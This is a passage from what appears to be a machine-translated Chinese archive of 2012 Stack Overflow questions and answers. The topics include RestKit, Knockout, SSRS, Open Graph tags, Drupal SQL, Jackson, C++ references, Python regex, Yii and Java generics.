    loader.params= params;
    loader.method= RKRequestMethodPOST;

} ]; 
```

-(void)objectLoaderDidFinishLoading:(RKObjectLoader *)objectLoader{

```
BOAccount* account;
NSArray* accounts = [BOAccount allObjects];
account = [accounts objectAtIndex:0]; 
```

}

但是数组帐户是空的。我也试过 -(void)objectLoaderDidFinishLoading:(RKObjectLoader *)objectLoader{ 但它给了我相同的结果。我知道我可以使用数组对象获得我想要的对象，但我需要在数据库中为我的项目保存对象。我知道对象被很好地解析了，因为我看到了 objectLoaderDidFinishLoading 的数组对象并且一切正常。

有谁知道发生了什么？更新前此功能正常！

更新：我发现如果我从模拟器或 iPad 中删除应用程序，有时它会在下次工作......我认为它可以帮助找到答案。我可以在 RestKit 将其放入缓存之前尝试使用这些项目吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-18T14:15:09.210

您需要手动将对象保存到 CoreData 的数据库中：

```
 loader.onDidLoadObjects = ^(NSArray *objects) {
        // Save:
        NSError* error = nil;
        [[RKObjectManager sharedManager].objectStore.managedObjectContextForCurrentThread save:&error];
        if (error) {
            NSLog(@"Save error: %@", error);
        }
     } 
```

# javascript - 敲除js中的滑动动作绑定

> ID：10446873
> 
> 赞同：7
> 
> 时间：2012-05-04T10:16:10.243
> 
> 标签：javascript, knockout.js, dom-events

我在我的应用程序中使用淘汰赛作为主要框架，它必须支持平板电脑和移动设备。由于该框架是建立在绑定处理程序上的，我想知道如何实现自定义绑定到动作（如滑动和其他设备特定的动作），或者可能有类似的事情完成？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-07T10:17:39.540

可能为时已晚，但这里有一个为 knockoutjs 添加触摸绑定的库： [https ://github.com/yaroslavya/knockouch](https://github.com/yaroslavya/knockouch)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-07T19:02:00.687

1.  创建一个`bindingHandler`. 这是一个真实项目的例子

    ```
    ko.bindingHandlers.swipeSections = {
    init: function (element, valueAccessor, allBindingsAccessor, viewModel, bindingContext) {
        var elem = $(element);
        var params = valueAccessor().split('##');

        elem.unbind('swipe');

        elem.swipe({
            swipeLeft: function (event, direction, distance, duration, fingerCount) {
                //process
            },
            swipeRight: function (event, direction, distance, duration, fingerCount) {
                //process
            }
        });
    } 
    ```

    };

2.  使用滑动库：[https ://github.com/mattbryson/TouchSwipe-Jquery-Plugin](https://github.com/mattbryson/TouchSwipe-Jquery-Plugin)

    ```
    script type="text/javascript" src="scripts/jquery.touchSwipe.js" 
    ```

3.  定义项目的绑定

    ```
    div id="myid" class="section" data-bind="swipeSections: 'leftPanel##rightPanel'" 
    ```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-19T13:44:59.910

我不知道它是否仍然有帮助，但这里有一个指针。

1.  使用像 Hammer.js 这样的库来获得多点触控操作。
2.  编写自定义绑定处理程序并调用淘汰赛的默认事件绑定。像这样的刷卡。（小提琴的作者使用tap.js）

[http://jsfiddle.net/snaptopixel/spByj/](http://jsfiddle.net/snaptopixel/spByj/)

现在你在你的 html 中所做的就是

```
<button data-bind="tap:doSomething">Click Me</button>​ 
```

其中 doSomething 是一个函数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-26T14:02:40.720

没有针对特定框架的内置绑定，因为 knockout.js 不依赖于任何其他框架。将您的 jQuery 选择器代码转换为引用 @niko 上面提供的链接的绑定处理程序应该是一项微不足道的任务。

# expect - 在 Expect 中做等价

> ID：10446875
> 
> 赞同：-2
> 
> 时间：2012-05-04T10:16:17.143
> 
> 标签：expect

“期望”脚本中是否有任何指令执行执行操作？
如果是，请分享详细信息

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-05-15T00:18:55.230

Expect 是 TCL 的扩展。TCL 定义了[while-loop](http://www.tcl.tk/man/tcl/TclCmd/while.htm)。[TCL 语法](http://tmml.sourceforge.net/doc/tcl/Tcl.html)与其他语言略有不同，因此您需要确保您的条件计算正确——但从概念上讲，循环就是循环，与语言无关。

# sql-server - SSRS 中的缓存与报告快照

> ID：10446876
> 
> 赞同：18
> 
> 时间：2012-05-04T10:16:18.383
> 
> 标签：sql-server, sql-server-2008, ssrs-2008, reporting-services

[我在这里](http://blogs.technet.com/b/rob/archive/2010/02/11/caching-ssrs-reports-for-performance.aspx)阅读了一篇关于如何提高 SSRS 性能的文章，我想知道；

1.  缓存和报告快照之间到底有什么区别？

2.  在缓存和报告快照之间做出决定时应该方便的参数是什么？

3.  作为SSRS中的性能提升，哪个性能提升工具更好：缓存还是快照？

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-05-04T14:44:26.833

缓存是最后执行的报告的副本。它不是一个持久化的副本，它有一个生命周期（比如缓存 30 分钟）。它存储在临时数据库中。每个报告只能有一个“实例”（如果有参数，则每个参数组合都有一个）

快照是报告的持久副本。它永久存储在报告数据库中。您可以拥有任意数量的。例如，您可以配置为每天保存一份报告的快照，因此如果您想查看 3 个月前的数据如何，您只需访问当天的快照即可。

何时使用其中一种非常棘手。我的大多数报告，我将它们缓存了 2 小时，因此第一个运行它的用户会遇到一点延迟，下一个用户将按需获取报告（当然是报告运行时的数据）

对于较大的报表，我会在晚上运行它们并将它们配置为从快照运行（选项“从报表执行快照呈现此报表”），当然，这些是摘要报表，其数据不需要真实显示时间。

# dotcloud - dotcloud 中的应用程序指标未显示任何活动

> ID：10446877
> 
> 赞同：0
> 
> 时间：2012-05-04T10:16:19.177
> 
> 标签：dotcloud

我的 Dotcloud 应用程序的“应用程序指标”页面在过去 24 小时内未显示任何活动。应该有一些我知道该应用程序已被访问的东西。

这个功能在一两周前运行良好。

我的应用程序是一个用 Play 构建的 java 应用程序！框架

这是一个已知问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T16:13:02.627

我不认为你做错了什么；我建议您联系[dotCloud 的支持](http://support.dotcloud.com/)。

# facebook - Facebook like 网页按钮说明

> ID：10446878
> 
> 赞同：0
> 
> 时间：2012-05-04T10:16:21.140
> 
> 标签：facebook, facebook-graph-api, facebook-like

我看到网页标题、链接、图片，但我无法获得任何描述。当用户在网页上单击时，我的客户想要一个描述文本。这不可能吗？？

我不得不使用旧的分享方式，因为新的方式不能与网站上的其他东西一起使用。

我已经通过 Facebook Debugger 运行它，它指出的唯一问题是：

```
Open Graph Warnings That Should Be Fixed:

Parser Mismatched Metadata: The parser's result for this metadata did not match the input metadata. Likely, this was caused by the data being ordered in an unexpected way, multiple values being given for a property only expecting a single value, or property values for a given property being mismatched. Here are the input property =>content pairs that were not seen in the parsed result: 'og:description => the site desc' 
```

但是我认为这只是因为我`<meta name="description">`也使用。因为它确实在调试器中获取并显示此信息：

```
Raw Open Graph Document Information

Meta Tag:   <meta property="og:url" content="http://website.nu/" />
Meta Tag:   <meta property="og:image" content="http://website.nu/img/img200x200.jpg" />
Meta Tag:   <meta property="og:title" content="website title" />
Meta Tag:   <meta property="og:type" content="website" />
Meta Tag:   <meta property="og:site_name" content="site_name" />
Meta Tag:   <meta property="fb:admins" content="[my fb id]" />
Meta Tag:   <meta property="og:description" content="site desc" /> 
```

## 网站源代码：

```
<head>  
    <meta name="description" content="Page description">

    <meta property="og:url" content="http://website.nu/"/>
    <meta property="og:image" content="http://website.nu/img/img_200x200.jpg"/>
    <meta property="og:title" content="Site title"/>
    <meta property="og:type" content="website"/>    
    <meta property="og:site_name" content="Site name"/> 
    <meta property="fb:admins" content="[my_fb_id]"/>
    <meta property="og:description" content="Page description, expected to output"/>    
</head>
<body>
    <iframe src="http://www.facebook.com/plugins/like.php?href=http://website.nu/index.php/&amp;send=false&amp;layout=button_count&amp;width=90&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:94px; height:20px;" allowTransparency="true"></iframe>
</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-24T22:52:13.303

尝试[修剪](http://php.net/manual/en/function.trim.php)您的内容，例如：

```
echo '<meta property="og:description" content="' . trim($content) . '"/>'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T12:55:49.903

og:description 必须在 og:image 属性之后。至少那对我有用。og:description 之后的描述或删除 description-metatag 并没有改变任何东西。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T21:31:07.420

尝试将 <meta name="description"> 标签放在 <meta property="og:description"> 标签之后。

# php - MySQL查询无法处理变量

> ID：10446879
> 
> 赞同：0
> 
> 时间：2012-05-04T10:16:26.073
> 
> 标签：php, mysql, drupal-7

我正在尝试查询我的数据库，但由于某种原因，查询仅在我输入硬编码的参数时才有效。如果我使用变量，查询拒绝工作......

这是我的带有硬编码参数的查询，并且工作得很好：

```
$q_jobs = 'select distinct nid from node n, field_data_field_job_tags as tags
          where (type= \'job\' and n.language = \'nl\' and tags.entity_id = n.nid 
               and tags.field_job_tags_value = \'Enterprise Asset Management\') 
          order by n.changed desc limit 7'; 
```

但是当我使用变量时，查询拒绝工作......

```
 $q_jobs = 'select distinct nid from node n, field_data_field_job_tags as tags
              where (type= \'job\' and n.language = :lang and tags.entity_id = n.nid 
                   and tags.field_job_tags_value = :title) 
              order by n.changed desc limit 7';
 $results_jobs = db_query($q_jobs, array(':lang' => $language->language, 
                                         ':title' => $node->title)); 
```

虽然这是一个 Drupal 查询，但我认为这只是我的语法中的某个错误？

我收到此错误：

> PDOException: SQLSTATE[42000]: 语法错误或访问冲突：1064 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的 '(type= 'job' and n.language = 'nl' and tags.entity_id = n.nid and tags.field_job' 附近使用正确的语法：选择与 {node} n 不同的 nid，field_data_field_job_tags 作为 tagswhere (type= 'job' and n.language = :lang and tags.entity_id = n.nid and tags.field_job_tags_value = :title)order by n.changed desc limit 7; Array ( [:lang] => nl [:title] => 企业资产管理 ) 在 rd_get_related_news_and_blogs()

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:24:57.913

你这里有一个错字：`field_data_field_job_tags as tagswhere (type=`- 之间应该有一个空格`tags`，`where`所以你的 SQL 的引用部分应该是`field_data_field_job_tags as tags where (type=`.

始终阅读所有 mysql 错误消息-始终引用失败的查询，因此您可以轻松地在查询中找到任何拼写错误或其他错误。

编辑：因为你不相信我，这是从 mysql 错误消息中重复查询：

```
select distinct nid from {node} n, field_data_field_job_tags as tagswhere (type= 'job' and n.language = :lang and tags.entity_id = n.nid and tags.field_job_tags_value = :title)order by n.changed desc limit 7; 
```

现在看看你`newline`在你的查询中有一个空格，以及 MySQL 返回失败的查询中应该（而不是）一个空格。然后在每一行的末尾放一个空格，看看查询是否有效......

`tags`我会帮助你， and 和and`where`之间应该有空格- 但事实并非如此。唯一的空间是之间和因为制表符空间......`\'Enterprise Asset Management\')``order by``n.nid``and tags.field_job_tags_value`

# javascript - Google Map OnClick，如何以编程方式获取点击点信息并添加 pushPin

> ID：10446884
> 
> 赞同：-1
> 
> 时间：2012-05-04T10:16:36.800
> 
> 标签：javascript, jquery, google-maps

我是谷歌地图编程的新手，我想：

*   添加图钉 onclick

*   获取点击的点位置

另外，我想用 javascript(&jquery) 编写代码

事实上，这是我的意思的一个例子

[http://www.gorissen.info/Pierre/maps/googleMapLocation.php](http://www.gorissen.info/Pierre/maps/googleMapLocation.php)

那么，任何人都可以向我提供有关如何编码的信息吗？亲切的问候！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T12:42:58.183

GEvent is Maps API 2 which is deprecated. You should be using Maps API 3 instead (especially if you're starting out 'new' and not having to maintain an old API 2 site). And when you do, something like this should work:

```
google.maps.event.addListener(map, 'click', function(event) {
    var marker = new google.maps.Marker({
        position: event.latLng,
        map: map
    });
}); 
```

# javascript - 用常量替换字符串是否值得优化 Javascript 代码？

> ID：10446887
> 
> 赞同：1
> 
> 时间：2012-05-04T10:16:40.007
> 
> 标签：javascript, string, performance, optimization

我经常使用 jquery，有时我的代码包含很多重复的 css 类名，例如：

```
$('#div1').addClass('funny-class');
...
$('#div2').addClass('funny-class');
...
$('#div1').removeClass('funny-class'); 
```

等等......我问自己是否值得使用伪常量清理代码，例如：

```
var constants = {
    FUNNY: 'funny-class'
}
...
$('#div1').addClass(cnst.FUNNY);
$('#div2').addClass(cnst.FUNNY);
$('#div1').removeClass(cnst.FUNNY); 
```

第一：最小化。如果“constants”是一个局部变量（隐藏在一个范围内），那么最小化器可能会用“aB”之类的最小化来替换“constants.FUNNY”的出现。

第二：速度。带有“常量”的代码比第一个更快？

你怎么看？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:42:48.140

您可以使用具有高级优化功能的 Google[闭包编译器](http://closure-compiler.appspot.com/home)来识别经常重复的字符串并将它们替换为*常量*变量引用。但是这种优化是微不足道的；如果你想改进你的代码，你可以通过缓存 jQuery 对象得到更好的改进（这是许多程序员通常忽略的问题）：

```
var $div1 = $('#div1');
var $div2 = $('#div2');
$div1.addClass('funny-class');
$div2.addClass('funny-class');
$div1.removeClass('funny-class'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:21:08.757

性能可能不明显，但使用常量而不是字符串始终是一个好习惯，因为您可以通过更改常量的值轻松修改值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T10:22:42.330

1.  是的，缩小器可能会减少`constants.FUNNY`变量，因为它*可能不会*检测到对变量的重用`'funny-class'`并将其分配给变量。

2.  速度差异将如此微不足道，您不必在意。一方面，您必须在作用域链中解析变量（非常快），但另一方面，您必须创建一个 String 原语（也很快）。

拥有对象的好处`constants`是，如果您决定更改分配的类的名称，您只需在一个地方进行，而不是 3 个；这是您应该考虑的**唯一好处……而不是 0.0000000000000001 秒的速度差异。**

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T10:23:00.577

将其放入变量中可以为您提供一定数量的“中央控制”而不是性能。

但是，将它们深入到对象中会导致性能损失。尽可能让它们靠近表面以避免示波器分辨率的开销。（这是最小的，但仍然是开销）

```
//this one is so deep:
constants.foo.bar.baz.bam

//this is just 1 level deep:
constants.bam 
```

另外，我会更担心您正在进行的 jQuery 调用

```
//two calls to #div1!
$('#div1').addClass(cnst.FUNNY);       //$() for div1
$('#div2').addClass(cnst.FUNNY);
$('#div1').removeClass(cnst.FUNNY);    //another $() for div1

//do this instead
var div1 = $('#div1')             //reference div1 once in a local variable

div1.addClass(cnst.FUNNY);        //use the reference to the object
$('#div2').addClass(cnst.FUNNY);
div1.removeClass(cnst.FUNNY);     //use the same reference to the object 
```

# json - 杰克逊自我参考导致循环

> ID：10446891
> 
> 赞同：16
> 
> 时间：2012-05-04T10:16:43.847
> 
> 标签：json, hibernate, jackson

使用 Jackson 将休眠对象转换为 JSON 时出现问题，因为某些对象在其定义中具有自引用。问题是我不控制这些实体的代码，所以我不能把注释放在那里。

实际上，我只想将递归的深度限制为 5 个级别。我需要适用于任何包含自引用的实体对象的通用代码。这可能吗？我不介意使用另一个 JSON 库。

以下简单代码

```
ObjectMapper mapper = new ObjectMapper();

Query q = session.createQuery("from Hazard ");
List<Hazard> hazards = q.list();

for (Hazard h : hazards) {
    String hazardJson;
    hazardJson = mapper.writeValueAsString(h);
} 
```

给我一个例外：

```
org.codehaus.jackson.map.JsonMappingException：直接自引用导致循环（通过引用链：com.fgm.imsma.pojo.Hazard["location"]->com.fgm.imsma.pojo.Location["location "])
    在 org.codehaus.jackson.map.ser.BeanPropertyWriter._reportSelfReference(BeanPropertyWriter.java:473)
    在 org.codehaus.jackson.map.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:411)
    在 org.codehaus.jackson.map.ser.BeanSerializer.serializeFields(BeanSerializer.java:245)
    在 org.codehaus.jackson.map.ser.BeanSerializer.serialize(BeanSerializer.java:212)
    在 org.codehaus.jackson.map.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:428)
    在 org.codehaus.jackson.map.ser.BeanSerializer.serializeFields(BeanSerializer.java:245)
    在 org.codehaus.jackson.map.ser.BeanSerializer.serialize(BeanSerializer.java:212)
    在 org.codehaus.jackson.map.ser.StdSerializerProvider._serializeValue(StdSerializerProvider.java:587)
    在 org.codehaus.jackson.map.ser.StdSerializerProvider.serializeValue(StdSerializerProvider.java:245)
    在 org.codehaus.jackson.map.ObjectMapper._configAndWriteValue(ObjectMapper.java:1993)
    在 org.codehaus.jackson.map.ObjectMapper.writeValueAsString(ObjectMapper.java:1595)
    在 imsma.json.GetObjects.main(GetObjects.java:47)

```

在此先感谢您的任何建议！

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-05-04T18:14:15.283

使用[Jackson 2.0](http://www.cowtowncoder.com/blog/archives/2012/03/entry_466.html) - 它处理循环引用（带`@JsonIdentityInfo`注释）

如果您不能直接向类添加注释，请使用 MixIn 注释。这里有一个例子：[https ://github.com/FasterXML/jackson-docs/wiki/JacksonMixInAnnotations](https://github.com/FasterXML/jackson-docs/wiki/JacksonMixInAnnotations)

# c - C - 改变矩阵的最后一个元素

> ID：10446895
> 
> 赞同：-1
> 
> 时间：2012-05-04T10:17:16.577
> 
> 标签：c, arrays, matrix

我有数组未知大小，我想转移到矩阵[n][2]。示例；

```
D[c]=1,2,3,4,5

D[c/2][2]=  1   2
            3   4
            5   0 
```

因此，如果数组的大小为奇数，我想添加 0 矩阵的最后一个成员。这是我的代码，但我不知道如何使 0 矩阵的最后一个成员

```
if (c%2==1){c=c+1;}
     for(r=0; r<(c/2); r++)
    {
        for(t=0; t<2; t++)
        {
           v++;
            matris[r][t]=D[v-1];
        }
    }
    matris[r][t]
      printf("\nmatrice:\n\n");
    for(r=0; r<(c/2); r++)
    {
        for(t=0; t<2; t++)
        {
            printf("%3u ", matris[r][t]);
        }
        printf("\n");
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:28:47.517

一种可能的解决方案是将数组初始化为全零：

```
int matris[4][4] = { 0 }; 
```

在填充期间未设置的任何内容都将保持为零。

# scala - 如何使用给定的 SecurityManager 运行 Akka Future？

> ID：10446903
> 
> 赞同：2
> 
> 时间：2012-05-04T10:17:46.340
> 
> 标签：scala, akka, future, securitymanager

对于一个用 Scala 编写的开源多人编程游戏，它通过插件系统从`.jar`文件中加载玩家的机器人代码，我想通过在限制条件下运行它们来防止机器人代码对服务器系统造成伤害`SecurityManager`执行。

当前实现使用 URLClassLoader 从其相关插件 .jar 文件中为每个机器人提取控制函数工厂。然后使用工厂为每一轮新的游戏实例化一个机器人控制函数实例。然后，每个模拟周期一次，同时调用所有机器人控制功能以获取机器人对其环境的响应。并发调用是使用 Akka 完成的`Future.traverse()`，其中隐式提供`ActorSystem`由其他并发操作组件（编译服务、Web 服务器、渲染）共享：

```
val future = Future.traverse(bots)(bot => Future { bot.respondTo(state) })
val result = Await.result(future, Duration.Inf) 
```

为了限制机器人插件中包含的潜在恶意代码运行，似乎遵循[这个 StackOverflow 问题](https://stackoverflow.com/questions/3947558/java-security-sandboxing-plugins-loaded-via-urlclassloader)和[这个](https://stackoverflow.com/questions/502218/sandbox-against-malicious-code-in-a-java-application)问题中采用的路径，我需要让机器人控制功能在适当限制性实现下运行的线程中`SecurityManager`执行。

现在的问题是：如何让 Akka 处理当前在`Future.traverse()`具有期望的线程中运行的Actors 完成的工作`SecurityManager`，而系统中的**其他**Actors，例如运行后台编译服务的 Actors，继续像现在一样运行，即不受限制？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T15:21:56.197

您可以构造一个`ExecutionContext`（例如 via `ExecutionContext.fromExecutorService`）的实例，该实例在限制性安全管理器下运行所有​​工作，并将其带入 and 的隐式`Future.apply`范围`Future.traverse`。

如果调用的函数不需要与环境交互，我认为您不需要单独的`ActorSystem`.

# c# - 使用 URL 调用默认浏览器并设置目标

> ID：10446905
> 
> 赞同：3
> 
> 时间：2012-05-04T10:18:02.503
> 
> 标签：c#, browser, default, target

我不知道是否有一种机制可以做到这一点：通常人们会简单地以 URL 作为字符串参数调用 process start - 有没有人知道或建议如何添加目标？

谷歌一直毫无帮助，否则我的查询有点没用。

正如你得到的行为一样：

```
<a href="http://www.google.co.uk" target="_blank">link in a new window</a> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:26:12.947

启动默认浏览器有什么危害？

你可以这样做，但如果 Firefox 不可用怎么办！！

```
ProcessStartInfo proc1 = new ProcessStartInfo("firefox.exe");
proc1.Arguments = "http://www.w3schools.com/tags/att_a_target.asp";
                  //"http://stackoverflow.com";
Process.Start(proc1); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:29:44.990

尝试 C# 的 selenium 和 WebDriver。

# c++ - 为什么参考大小总是 4 个字节 - c++

> ID：10446907
> 
> 赞同：19
> 
> 时间：2012-05-04T10:18:14.477
> 
> 标签：c++, reference

在 32 位机器上，我总是得到`sizeof`4 个字节的引用，即使它是对双精度的引用，那么它在这 4 个字节中真正存储了什么。

**编辑 ：**

```
class A{
public:
  double&  a;
};

int main(){
  cout << sizeof(A) << endl; // this will print out 4
} 
```

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-05-04T10:21:59.927

`sizeof`该标准在(C++11, 5.3.3/4)上非常明确：

> 当应用于引用或引用类型时，结果是被引用类型的大小。

因此，如果您真的在`sizeof(double&)`使用 ，编译器会告诉您这`sizeof(double)`是 4。

**更新：**所以，你真正在做的是申请`sizeof`一个类类型。在这种情况下，

> 当应用于一个类时，结果是该类的对象中的字节数 [...]

所以我们知道内部引用的存在`A`导致它占用了 4 个字节。这是因为即使标准没有规定如何实现引用，编译器仍然必须以某种方式实现它们。这在某种程度上可能会因上下文而有很大不同，但对于类类型的引用成员，唯一有意义的方法是偷偷溜进`double*`你的背后，并`double&`在你的脸上称它为 a。

因此，如果您的体系结构是 32 位（其中指针长度为 4 个字节），则可以解释结果。

请记住，引用*的概念*与任何特定实现无关。该标准允许编译器根据需要实现引用。

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2012-05-04T10:22:49.087

你不能，事实并非如此。

C++ 引用*不是*指针。它是对象的别名。*有时*，编译器选择使用指针来实现这一点。但通常，它通过*什么都不做*来实现它。通过简单地生成直接引用原始对象的代码。

在任何情况下，`sizeof`应用于引用类型*都不会为您提供引用的大小*。因此，您在做什么并不是很清楚，因此无法解释正在发生的事情。

**编辑**

现在您已经展示了一些代码，我们可以回答这个问题：

您正在获取包含引用的类的大小。正如我上面所说，引用不是指针，但在必要时，编译器可能会退回到使用指针来表示它。当您创建一个包含引用的类时，编译器可以实现它的唯一（理智）方法是定义一个包含对象地址的类。在 32 位系统上，地址为 32 位或 4 字节宽。所以`sizeof`这样的班级（通常）是4。

# python - 正则表达式匹配逗号或换行符，但不能同时匹配

> ID：10446908
> 
> 赞同：2
> 
> 时间：2012-05-04T10:18:15.557
> 
> 标签：python, regex, csv

我遇到了以下 python 脚本的问题，该脚本从公司内部 Web 应用程序文本区域中的文本中提取一些选项。

```
import re

text = 'option one\noption two, option three, option four'
correct = 'option one, option two, option three, option four'

pattern = re.compile('(\s*[,]\s*)')
fixed = pattern.sub(', ', text)

print fixed
option one
option two, option three, option four

print fixed.split(', ')
['option one\noption two', 'option three', 'option four'] 
```

这显然无法将“选项一\n选项二”拆分为“选项一”、“选项二”

所以输入可能最终为

```
option one
option two, option three, option four 
```

这将需要转换为

```
option one, option two, option three, option four 
```

如果是逗号，它可以正常工作

或者

逗号后跟换行符

但如果它本身只是一个换行符，则不是。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T10:24:31.513

将您的角色类从 扩展`[,]`到`[,\n]`，也许？另外，为什么不直接在正则表达式上拆分，而不是先搜索替换再拆分？这个功能：[http](http://docs.python.org/library/re.html?highlight=re.split#re.split) ://docs.python.org/library/re.html?highlight=re.split#re.split可以派上用场。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-04T10:22:28.017

你能试试吗

```
(\s*(,|\n)\s*) 
```

?

或者可能更好

```
(\s*[,\n]\s*) 
```

...我总是忘记您可以`\n`参加角色课程...

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-04T13:00:08.757

我没有正则表达式就到了那里：

```
print [x.strip() for x in text.replace('\n', ', ').split(', ')] 
```

结果：

```
['option one', 'option two', 'option three', 'option four'] 
```

我并不是说这对您的用例来说是一个很好的答案。如果您需要添加额外的分隔符，则意味着`.replace()`为每个分隔符添加一个额外的分隔符。

# php - 如何将文字 JavaScript 代码传递给 Yii 框架方法？

> ID：10446911
> 
> 赞同：2
> 
> 时间：2012-05-04T10:18:16.223
> 
> 标签：php, jquery, ajax, yii

我正在使用 的相应方法生成一个复选框`CHtml`，并且我想在 AJAX 请求之前和之后运行一些 JavaScript 代码。这是代码：

```
echo CHtml::checkBox('markComplete', FALSE, 
    array(
        'class' => 'markComplete',
        'ajax'  => array(
            'type'       => 'POST',
            'url'        => $this->createUrl('/events/events/MarkComplete'),
            'data'       => 'event_status='.$events['id'],
            'beforeSend' => 'function(){ $(this).parent("TR").hide(); }',
            'success'    => 'function(resp) { $("#right").append(resp); }'
        ),
    )
); 
```

我如何告诉 Yii是 JavaScript 代码`beforeSend`而`success`不是纯字符串？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T10:49:44.237

## 从 Yii 1.1.11 开始提供更好的选择

现在，所有框架类都支持通过[`CJavaScriptExpression`](http://www.yiiframework.com/doc/api/1.1/CJavaScriptExpression). 像这样使用它：

```
'ajax' => array(
    'beforeSend' => new CJavaScriptExpression(
        'function(){ $(this).parent("TR").hide(); }'
    ),
    // ...
) 
```

默认情况下，字符串前缀选项`js:`仍然可用，但现在可以根据需要使用可选参数 on 禁用它[`CJavaScript::encode`](http://www.yiiframework.com/doc/api/1.1/CJavaScript#encode-detail)。

## 原始答案

如果你想包含文字 JavaScript 代码作为选项的一部分，Yii 中的约定是在代码前面加上`js:`. 所以你会这样写：

```
'ajax' => array(
    'type'=>'POST',
    'url'=>$this->createUrl('/events/events/MarkComplete'),
    'data'=>'event_status='.$events['id'],
    'beforeSend' => 'js:function(){            
        $(this).parent("TR").hide();

    }',
    'success'=>'js:function(resp) {
        $("#right").append(resp);

    }'
    ),
) 
```

不幸的是，这没有很好的记录，这就是为什么人们不时遇到[这个问题](http://code.google.com/p/yii/issues/detail?id=2067)的原因。

# pagerank - Google 是否会将其以前的 PageRank 归还给在一段时间内返回 301 的页面

> ID：10446913
> 
> 赞同：1
> 
> 时间：2012-05-04T10:18:28.060
> 
> 标签：pagerank

我犯了一个可怕的错误。

2 个月前，我在一个 PHP 页面上放置了一个 301 永久重定向，该页面显示了我网站的许多旧页面。

但是这些页面对 SEO 非常友好，并且具有良好的 PageRank。

今天我删除了 301 重定向。

这些页面会恢复原来的 PageRank 吗？还是会被重置？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-01-20T21:38:30.523

如果谷歌仍然觉得这些页面很有趣，那么是的，你会恢复你的排名。然而，由于这些页面不再排名，其他人可能已经替换了它们，同时用户可能发现它们更有趣。可能还存在影响您的页面的排名算法修改。

# php - 在php中将主数组的相同值与从数组结合起来

> ID：10446918
> 
> 赞同：1
> 
> 时间：2012-05-04T10:18:51.310
> 
> 标签：php, arrays, multidimensional-array

我有一个主阵列和多个从阵列，我需要替换相同阵列键上的值的函数。

**例子：**

主阵列：

```
$master = array(**"a"=>"master a"**,**"b"=>"master b"** "c"=>"master c"); 
```

从阵列：

```
$slave_a = array("s1"=>array(**"a"=>"slave a"**,"f"=>"slave f"));
$slave_b = array("s2"=>"slave" **"b"="slave b"**); 
```

我需要过滤从属数组的函数，如下所示：

```
$slave_a to be array("s1"=>array(**"a"=>"master a"**,"f"=>"slave f"));
$slave_b to be array("s2"=>"slave" **"b"="master b"**); 
```

Т提前感谢，对不起我的英语不好

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T11:36:11.537

好的，所以在使用您解析 ini 文件后，`parse_ini_file`您应该得到与此类似的数组（当使用进程部分 TRUE 时）：

```
$first_ini = array(
    'MAIN' => array(
        'lib' => 'lib_folder',
        'bin' => 'bin_folder',
        'usr' => 'usr_folder',
        'etc' => 'etc_folder'
    )
);

$second_ini = array(
    'alib' => 1,
    'abin' => 0,
    'ausr_other' => 'usr/tree'
);

$master_ini = array(
    'lib' => 'lib_other',
    'abin' => 1
); 
```

然后您可以使用这个简单的功能（未测试）：

```
function combine_master_with_slave($master, $slave) {
    foreach($slave as $key => $val) { // we will loop through slave array
        if(is_array($val)) { // if the value is an array use recursion
            $slave[$key] = combine_master_with_slave($master, $val);
        }
        if(isset($master[$key])) { // if master array contains the same key as a slave array, replace it's value by the master's one
            $slave[$key] = $master[$key];
        }
    }
    return $slave; // finaly return the processed slave array
} 
```

但我真的不确定这是否可行，也许它需要一些轻微的修改......

此外，您必须调用此函数的次数是您拥有的从阵列数量的倍数，或者换句话说，您必须为每个从阵列调用此函数。

这应该适用于任何子数组级别，即使它是 [ [ [ [ [ [][][][] ] ] ] ] ]。

# java - java - 如何接口可以扩展2与扩展相同但在java中具有不同的泛型参数？

> ID：10446920
> 
> 赞同：4
> 
> 时间：2012-05-04T10:18:54.677
> 
> 标签：java, interface, multiple-inheritance

问题：

基础接口：

```
 IBase 
```

后人：

```
InterfaceA extends IBase<Interface1>

InterfaceB extends IBase<Interface2> 
```

当我尝试：

```
InterfaceC extends InterfaceA, InterfaceB 
```

我收到编译错误：

```
The interface IBase cannot be implemented more than once with different arguments 
```

是否存在解决方法？谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T10:35:36.310

这是不可能的，至少在 Java 中是不可能的。考虑以下场景：

```
 interface Base<K> {
    K get();
}

